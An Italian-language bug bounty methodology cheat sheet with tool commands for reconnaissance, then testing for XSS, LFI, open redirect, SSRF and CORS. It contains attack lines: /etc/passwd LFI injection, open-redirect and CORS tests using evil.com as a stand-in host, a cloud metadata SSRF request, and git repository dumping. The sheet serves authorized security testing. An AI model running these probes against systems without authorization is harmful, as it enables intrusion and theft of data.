# 🐛 Bug Bounty Methodology

```
  ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
  ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
  ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
  ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
  ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
  ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
            Complete Bug Bounty Hunting Methodology
```

<p align="center">
  <img src="https://img.shields.io/badge/Bug_Bounty-Methodology-red?style=for-the-badge" alt="Bug Bounty">
  <img src="https://img.shields.io/badge/Recon-blue?style=for-the-badge" alt="Recon">
  <img src="https://img.shields.io/badge/Vulnerability-green?style=for-the-badge" alt="Vuln">
</p>

---

## 🗺️ Panoramica del Flusso di Attacco

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      BUG BOUNTY HUNTING METHODOLOGY                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  PHASE 1: Subdomain Enum    PHASE 2: ASN & IP        PHASE 3: Live Hosts   │
│  ├── Subfinder              ├── ASN Mapping          ├── HTTPX Probing     │
│  ├── Amass                  ├── IP Harvesting        ├── Port Discovery    │
│  ├── crt.sh                 └── Shodan               └── Aquatone          │
│  └── Wayback                                                                │
│                                                                             │
│  PHASE 4: URL Collection    PHASE 5: Vuln Hunting    PHASE 6: Deep Dive    │
│  ├── Katana/Hakrawler       ├── XSS Testing          ├── Directory Brute   │
│  ├── GAU                    ├── LFI/RFI              ├── Parameter Fuzzing │
│  └── Parameter Extract      ├── SSRF/CORS            └── Git Exposure      │
│                             └── Open Redirect                               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Indice

1. [Fase 1: Subdomain Enumeration](#-fase-1-subdomain-enumeration)
2. [Fase 2: ASN & IP Discovery](#-fase-2-asn--ip-discovery)
3. [Fase 3: Live Host Discovery](#-fase-3-live-host-discovery)
4. [Fase 4: URL Collection](#-fase-4-url-collection)
5. [Fase 5: Vulnerability Hunting](#-fase-5-vulnerability-hunting)
6. [Fase 6: Directory & File Discovery](#-fase-6-directory--file-discovery)
7. [Riferimento Rapido](#-riferimento-rapido)
8. [Installazione del Tool](#-installazione-del-tool)
9. [Consigli per Bug Bounty](#-consigli-per-bug-bounty)

---

## 🔍 Fase 1: Subdomain Enumeration

> **Obiettivo:** Trovare il maggior numero possibile di subdomain - più ampia è la superficie di attacco, maggiore è la possibilità di trovare vulnerabilità.

### Strumenti di Enumerazione Automatizzata

#### Subfinder
```bash
# Scoperta rapida di subdomain usando molteplici fonti di dati
subfinder -d example.com -all -recursive -o subfinder.txt

# Spiegazione flag:
# -all: Usa tutte le fonti (free + premium)
# -recursive: Enumerazione ricorsiva dei subdomain
# -o: File di output
```
> 💡 **Suggerimento:** Subfinder è veloce e affidabile. Usa `-all` per risultati completi.

#### Assetfinder
```bash
# Trova domini e subdomain associati a un target
assetfinder --subs-only example.com > assetfinder.txt

# Veloce e semplice - buono per una prima ricognizione
```
> 💡 **Suggerimento:** Assetfinder è veloce ma meno completo. Usalo insieme ad altri strumenti.

#### Sublist3r
```bash
# Enumerazione subdomain tramite tecniche OSINT
sublist3r -d example.com -e baidu,yahoo,google,bing,ask,netcraft,virustotal,threatcrowd,crtsh,passivedns -v -o sublist3r.txt

# -e: Specifica i motori di ricerca
# -v: Output verboso
```

#### Amass
```bash
# Mappatura approfondita della superficie di attacco (il più potente!)
amass enum -passive -d example.com | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt

# Modalità passive - non interagisce direttamente con il target
# Usa -active per più risultati (ma più rilevabile)
```
> ⚠️ **Attenzione:** Amass in attivo può essere rilevabile. Usa prima la modalità passiva!

### Fonti Pubbliche

#### Certificate Transparency (crt.sh)
```bash
# Trova subdomain dai log dei certificati SSL
curl -s https://crt.sh\?q\=\example.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' > crtsh.txt
```
> 💡 **Perché crt.sh?** I certificati SSL sono pubblici - ottima fonte di subdomain!

#### Wayback Machine
```bash
# Scoperta storica di subdomain dagli archivi web
curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" | sort | sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u > wayback.txt
```
> 💡 **Pro Tip:** Vecchi subdomain potrebbero ancora esistere ma essere dimenticati - facili da sfruttare!

### Elaborazione Subdomain

#### Unione & Filtraggio Risultati
```bash
# Unisci tutti i file di subdomain e rimuovi i duplicati
cat *.txt | sort -u > final_subdomains.txt

# Conta i risultati
wc -l final_subdomains.txt
```

#### FFUF Subdomain Bruteforce
```bash
# Bruteforce dei subdomain usando wordlist
ffuf -u "https://FUZZ.example.com" -w wordlist.txt -mc 200,301,302

# -mc: Considera solo specifici status code
# Wordlist suggerita: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### Subdomain Permutation con Alterx
```bash
# Genera permutazioni di subdomain e risolvile
subfinder -d example.com | alterx | dnsx

# Arricchisci il dominio con pattern comuni
echo example.com | alterx -enrich | dnsx

# Usa una wordlist per la permutazione
echo example.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx
```
> 💡 **Esempio:** Se trovi `dev.example.com`, alterx genera `dev1`, `dev2`, `dev-api`, ecc.

---

## 🌐 Fase 2: ASN & IP Discovery

> **Obiettivo:** Trovare intervalli IP e infrastrutture associate all'organizzazione target.

### ASN Mapping

```bash
# Scopri indirizzi IP associati all'ASN del dominio
asnmap -d example.com | dnsx -silent -resp-only

# Scopri asset tramite nome organizzazione
amass intel -org "organization_name"

# Scopri asset in un intervallo IP
amass intel -active -cidr 159.69.129.82/32

# Scopri asset tramite numero ASN
amass intel -active -asn [asnno]
```
> 💡 **Perché ASN?** Le organizzazioni spesso possiedono interi range IP - trova server nascosti!

### IP Harvesting

#### VirusTotal
```bash
# Estrai indirizzi IP da VirusTotal
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=example.com&apikey=[api-key]" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### AlienVault OTX
```bash
# Ottieni indirizzi IP da AlienVault Open Threat Exchange
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/example.com/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### URLScan.io
```bash
# Estrai indirizzi IP da URLScan.io
curl -s "https://urlscan.io/api/v1/search/?q=domain:example.com&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### Shodan SSL Search
```bash
# Trova indirizzi IP tramite ricerca certificati SSL su Shodan
shodan search Ssl.cert.subject.CN:"example.com" 200 --fields ip_str | httpx -sc -title -server -td
```
> 💡 **Pro Tip:** La ricerca SSL di Shodan trova server che usano il certificato del target - anche quelli nascosti!

---

## ✅ Fase 3: Live Host Discovery

> **Obiettivo:** Filtrare i subdomain per trovare solo host attivi e accessibili.

### HTTP Probing con HTTPX

```bash
# Probing base su più porte
cat subdomain.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

# Probing dettagliato con status code, titoli e rilevamento tecnologie
cat subdomain.txt | httpx -sc -title -server -td -ports 80,443,8080,8000,8888 -threads 200

# Flag:
# -sc: Status code
# -title: Titolo pagina
# -server: Header server
# -td: Technology detection
```

### Visual Recon con Aquatone

```bash
# Screenshot degli host attivi
cat hosts.txt | aquatone

# Porte personalizzate
cat hosts.txt | aquatone -ports 80,443,8000,8080,8443

# Range porte esteso (completo)
cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
```
> 💡 **Perché Screenshot?** Identifica rapidamente applicazioni interessanti, login panel ed error page.

---

## 🔗 Fase 4: URL Collection

> **Obiettivo:** Raccogliere il maggior numero possibile di URL per testare parametri e vulnerabilità.

### Active Crawling

#### Katana
```bash
# Web crawler veloce per la scoperta di URL
katana -u livesubdomains.txt -d 2 -o urls.txt

# -d 2: Profondità 2 livelli
# Veloce ed efficiente per web app moderne
```

#### Hakrawler
```bash
# Web crawler semplice e veloce
cat urls.txt | hakrawler -u > crawled_urls.txt
```

### Passive URL Collection

#### GAU (Get All URLs)
```bash
# Recupera URL noti da AlienVault OTX, Wayback Machine e Common Crawl
cat livesubdomains.txt | gau | sort -u > passive_urls.txt

# Ottieni URL con status code 200 e filtra duplicati
echo example.com | gau --mc 200 | urldedupe > urls.txt
```
> 💡 **Perché GAU?** Trova URL da dati storici che potrebbero rivelare endpoint nascosti!

#### URLFinder
```bash
# Trova URL da varie fonti
urlfinder -d example.com | sort -u > urlfinder_urls.txt
```

### Estrazione Parametri

```bash
# Estrai URL contenenti parametri (oro per i test!)
cat allurls.txt | grep '=' | urldedupe | tee params_urls.txt

# Pattern matching parametri
cat allurls.txt | grep -E '\?[^=]+=.+$' | tee params_urls.txt

# GF SQLi pattern - URL potenzialmente vulnerabili a SQL injection
cat allurls.txt | gf sqli

# GF XSS pattern
cat allurls.txt | gf xss

# GF LFI pattern
cat allurls.txt | gf lfi
```
> 💡 **GF Patterns:** Installa `gf` e scarica i pattern da github.com/1ndianl33t/Gf-Patterns

---

## 🔓 Fase 5: Vulnerability Hunting

### 🔴 XSS Discovery

#### Reflected XSS Testing
```bash
# Pipeline completa per il test di reflected XSS
subfinder -d "example.com" -all -recursive | \
httpx -mc 200 -silent | \
sed -E 's,https?://(www\.)?,,' | anew | \
urlfinder -all | \
iconv -f ISO-8859-1 -t UTF-8 -c | \
grep -aE '\?.*=.*(&.*)?' | \
grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | \
awk -F'[?&=]' '!seen[$1$2]++' | anew
```

#### Blind XSS Testing
```bash
# Test Blind XSS con payload specializzati
# Usa servizi come XSS Hunter o Burp Collaborator
# Inserisci il payload in tutti i campi input, header e parametri
```
> 💡 **Blind XSS:** I payload vengono eseguiti successivamente quando l'admin visualizza i dati - usa server di callback!

### 🔴 LFI Discovery

```bash
# Test LFI con FFUF e rilevamento file passwd
echo "https://example.com/" | gau | gf lfi | uro | \
sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | \
xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v

# Test LFI con curl e processi paralleli
gau example.com | gf lfi | qsreplace "/etc/passwd" | \
xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# HTTPx LFI test
echo 'https://example.com/index.php?page=' | \
httpx -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
```
> 💡 **LFI Tip:** Prova `/etc/passwd`, `....//....//etc/passwd` e varianti codificate!

### 🔴 Open Redirect Discovery

```bash
# Trova parametri di redirect
cat urls.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|next=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_url=|rurl=|target=|to=|url=" | tee redirect_params.txt

# GF redirect pattern
cat urls.txt | gf redirect | uro | sort -u | tee redirect_params.txt

# Test parametri di redirect
cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"

# Pipeline completa open redirect
subfinder -d example.com -all | httpx -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
```

### 🔴 SSRF Discovery

```bash
# Trova parametri vulnerabili a SSRF
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u

# Trova pattern API/Webhook
cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u

# Nuclei SSRF scan
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/

# Test SSRF base verso localhost
curl "https://example.com/page?url=http://127.0.0.1:80/"

# SSRF metadata cloud (AWS)
curl "https://example.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
```
> ⚠️ **Impatto SSRF:** Può accedere a servizi interni, metadata cloud e altro!

### 🔴 CORS Testing

```bash
# Test configurazione CORS con origin custom
curl -H "Origin: http://evil.com" -I https://example.com/api/

# Analisi dettagliata CORS
curl -H "Origin: http://evil.com" -I https://example.com/api/ | \
grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"

# Scansione CORS automatizzata con Nuclei
cat subdomains.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
```
> 💡 **CORS Vuln:** Se `Access-Control-Allow-Origin: *` con credenziali = Critico!

### Nuclei Vulnerability Scanning

```bash
# Singolo target
nuclei -u https://example.com -bs 50 -c 30

# Target Multipli
nuclei -l live_domains.txt -bs 50 -c 30

# Solo criticità alta e critica
nuclei -l live_domains.txt -s critical,high -bs 50 -c 30

# -bs: Bulk size
# -c: Concurrency
```

---

## 📂 Fase 6: Directory & File Discovery

### Sensitive File Discovery

```bash
# Estensioni file sensibili base
cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"

# Regex estesa file sensibili
cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"

# Google Dork per file
# site:*.example.com (ext:doc OR ext:docx OR ext:pdf OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:sql OR ext:bak OR ext:conf OR ext:log)
```

### Directory Bruteforcing

#### Dirsearch
```bash
# Scoperta directory base
dirsearch -u https://example.com --full-url --deep-recursive -r

# Con più estensioni
dirsearch -u https://example.com -e php,cgi,htm,html,js,txt,bak,zip,old,conf,log,asp,aspx,jsp,sql,json,xml,yml,yaml,py,rb --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects
```

#### FFUF Directory Discovery
```bash
# FFUF directory bruteforce completo
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
-u https://example.com/FUZZ \
-fc 400,401,402,403,404,429,500,501,502,503 \
-recursion -recursion-depth 2 \
-e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env \
-ac -c \
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" \
-t 10
```

### Git Exposure Detection

```bash
# Rileva directory .git esposte
cat domains.txt | httpx -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe

# Controlla .git/config
curl -s https://example.com/.git/config

# Dump repo git se esposta
git-dumper https://example.com/.git/ output/
```
> ⚠️ **Git Exposure:** Può esporre codice sorgente, credenziali e segreti!

### Hidden Parameter Discovery con Arjun

```bash
# Scoperta passiva parametri
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

# Scoperta attiva parametri con wordlist
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m GET,POST \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
```

### Subdomain Takeover

```bash
# Rilevamento takeover subdomain automatizzato
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```
> 💡 **Segnali Takeover:** CNAME che punta a servizi non reclamati (S3, Heroku, ecc.)

### WordPress Testing

```bash
# Scansione completa sicurezza WordPress
wpscan --url https://example.com --disable-tls-checks --api-token YOUR_API_TOKEN \
-e at -e ap -e u --enumerate ap --plugins-detection aggressive --force

# -e at: Tutti i temi
# -e ap: Tutti i plugin
# -e u: Utenti
```

---

## 📊 Riferimento Rapido

### Recon Pipeline

```bash
# 1. Subdomain Enumeration
subfinder -d example.com -all -recursive -o subs.txt
amass enum -passive -d example.com >> subs.txt
cat subs.txt | sort -u > all_subs.txt

# 2. Live Host Discovery
cat all_subs.txt | httpx -ports 80,443,8080,8000 -threads 200 > alive.txt

# 3. URL Collection
cat alive.txt | gau | sort -u > urls.txt
cat alive.txt | katana -d 2 >> urls.txt

# 4. Parameter URL
cat urls.txt | grep '=' | urldedupe > params.txt

# 5. Vulnerability Scanning
nuclei -l alive.txt -s critical,high -o nuclei_results.txt
```

### One-Liner Essenziali

| Scopo | Comando |
|---------|---------|
| Trova subdomain | `subfinder -d target.com -silent` |
| Controlla host attivi | `cat subs.txt \| httpx -silent` |
| Ottieni tutti gli URL | `echo target.com \| gau` |
| Trova parametri | `cat urls.txt \| grep '='` |
| Testa redirect | `cat urls.txt \| gf redirect` |
| Scansione nuclei | `nuclei -l hosts.txt -s critical,high` |

### Estensioni File da Cercare

| Tipo | Estensioni |
|------|------------|
| **Config** | `.env, .config, .conf, .ini, .yml, .yaml` |
| **Backup** | `.bak, .old, .backup, .zip, .tar.gz` |
| **Source** | `.php, .asp, .aspx, .jsp, .py, .rb` |
| **Data** | `.sql, .db, .sqlite, .json, .xml` |
| **Docs** | `.pdf, .doc, .docx, .xls, .xlsx` |

---

## 🛠️ Installazione del Tool

### Strumenti Essenziali

```bash
# Subfinder
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# HTTPX
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Katana
go install github.com/projectdiscovery/katana/cmd/katana@latest

# GAU
go install github.com/lc/gau/v2/cmd/gau@latest

# FFUF
go install github.com/ffuf/ffuf/v2@latest

# Amass
go install -v github.com/owasp-amass/amass/v4/...@master

# Assetfinder
go install github.com/tomnomnom/assetfinder@latest
```

### Tool per XSS & Redirect

```bash
# OR (Open Redirect Tester)
go install -v github.com/h6nt3r/or@latest

# RC (Reflected XSS)
go install -v github.com/h6nt3r/rc@latest

# CXSS (Contextual XSS Scanner)
go install github.com/haxshadow/cxss@latest

# XSSER
go install -v github.com/h6nt3r/xsser@latest

# GF (Grep Patterns)
go install github.com/tomnomnom/gf@latest
```

### Tool Utility

```bash
# URO (URL Deduplication)
pip3 install uro

# Arjun (Parameter Discovery)
pip3 install arjun

# Subzy (Takeover Detection)
go install -v github.com/PentestPad/subzy@latest
```

---

## 🎯 Consigli per Bug Bounty

1. **Automatizza, ma verifica manualmente** - Gli strumenti trovano candidati, tu confermi le vulnerabilità
2. **Controlla robots.txt e sitemap.xml** - Spesso rivelano percorsi nascosti
3. **Guarda i file JavaScript** - Endpoint API, segreti, credenziali hardcoded
4. **Testa tutti i parametri** - Anche quelli nascosti (usa Arjun)
5. **Combina vulnerabilità** - SSRF + XSS = Impatto maggiore
6. **La qualità del report conta** - PoC chiaro, impatto, passi di riproduzione
7. **Sii paziente** - I bug migliori richiedono tempo

---

## 📚 Cheatsheet Correlate

- [Nuclei](../Nuclei/translations/README.it.md)
- [ffuf](../ffuf/translations/README.it.md)
- [Subfinder](../Subfinder/translations/README.it.md)
- [httpx](../httpx/translations/README.it.md)
- [Google Dorking](../Google-Dorking/translations/README.it.md)
- [Burp Suite](../Burp-Suite/translations/README.it.md)

---

<p align="center">
  <b>🐛 Buona caccia!</b><br>
  <i>Bug Bounty - Dove la perseveranza incontra la ricompensa</i>
</p>
